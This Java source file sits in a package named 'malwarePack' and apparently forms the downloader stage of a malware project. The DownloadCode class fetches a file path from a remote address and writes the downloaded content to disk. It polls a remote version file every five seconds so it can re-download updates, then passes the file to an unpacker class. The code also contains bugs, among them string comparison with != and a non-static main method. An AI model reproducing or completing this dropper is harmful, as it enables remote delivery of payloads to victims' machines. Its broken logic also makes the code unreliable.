package malwarePack;

import java.io.*;
import java.net.*;

public class DownloadCode {
	String url;
	String local;
	String version;
	public DownloadCode(String link, String localdireccion) {
		url = link;
		version = url+"version";
		local = localdireccion;
	}
	private String pop(String s) {
		String x = "";
		for(int i=0;i<s.length()-1;i++) {x += Character.toString(s.charAt(i));}
		return x;
	}
	private void wget() throws IOException {
		URL direccionImagen = new URL(url);
		InputStream rederDireccion = direccionImagen.openStream();
		String direccion = read(rederDireccion);
		direccion = pop(direccion);
		System.out.println(url+direccion);
		URL imagenWeb = new URL(url+direccion);
		InputStream rederImagen = imagenWeb.openStream();
		FileWriter file = new FileWriter(local);
		String texto = read(rederImagen);
		file.write(texto);
		file.close();
		URL fileVersion = new URL(version);
		InputStream readerVersion = fileVersion.openStream();
		FileWriter writeVersion = new FileWriter("DirecciónArchivoVersión");
		String numeroVersion = read(readerVersion);
		writeVersion.write(numeroVersion);
		writeVersion.close();
	}
	public static String read(InputStream reader) throws IOException {
		int i=0;
		String texto = "";
		while(i != -1) {
			i = reader.read();
			char caracter = (char) i;
			texto += Character.toString(caracter);
		}
		return texto;
	}
	private static String read(FileReader reader) throws IOException {
		int i=0;
		String texto = "";
		while(i != -1) {
			i = reader.read();
			char caracter = (char) i;
			texto += Character.toString(caracter);
		}
		return texto;
	}
	
	private void actualizar() throws IOException {
		while(true) {
			URL url = new URL(version);
			FileReader version = new FileReader("version");
			InputStream stream = url.openStream();
			String versionCodigo = read(stream);
			if(read(version) != versionCodigo) {
				DownloadCode code = new DownloadCode("DireccionWeb","version");
				code.wget();
			}
			try{ Thread.sleep(5000); }
		catch(InterruptedException e ){}
		}
}
	public void main(String args[]) throws IOException, InterruptedException {
		DownloadCode code = new DownloadCode("DireccionWeb" , "version");
		code.wget();
		Unpaquer unpaquer = new Unpaquer(local);
		unpaquer.main();
	
	}
	
}
